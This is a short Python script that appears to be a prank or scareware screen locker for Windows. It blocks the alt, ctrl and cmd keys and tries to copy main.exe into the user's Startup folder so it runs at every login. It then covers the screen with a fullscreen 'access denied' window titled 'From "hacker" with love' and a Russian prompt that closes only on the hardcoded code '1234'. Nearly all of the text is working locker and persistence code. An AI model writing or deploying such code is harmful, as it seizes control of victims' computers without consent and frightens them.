import time
from tkinter import *
import keyboard
keyboard.block_key('alt')
keyboard.block_key('ctrl')
keyboard.block_key('cmd')
import os
import shutil

from PIL import ImageTk, Image

run_patch = os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
try:
    shutil.copyfile(".\main.exe", run_patch)
except:
    pass

def closing(event):
    code = entry_code.get()
    if code == "1234":
        quit()
    else:
        entry_code.delete(0, "end")

root = Tk()
img = ImageTk.PhotoImage(Image.open("access-denied.jpg"))

width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.title('From "hacker" with love')
root.attributes("-fullscreen", True)
root.configure(background="black")

panel = Label(root, image=img, border=0)
panel.pack(expand=True)

label_code = Label(root, text="Введите код доступа: ", font=("tahoma", 16, "bold"), foreground="green", background="black")
label_code.place(x=width/2 + 200, y =height/2 + 250)
entry_code = Entry(root, background="green", border=False, font=("tahoma", 16, "bold"))
entry_code.place(x=width/2 + 200, y =height/2 + 300)


entry_code.bind("<Return>", closing)

root.mainloop()
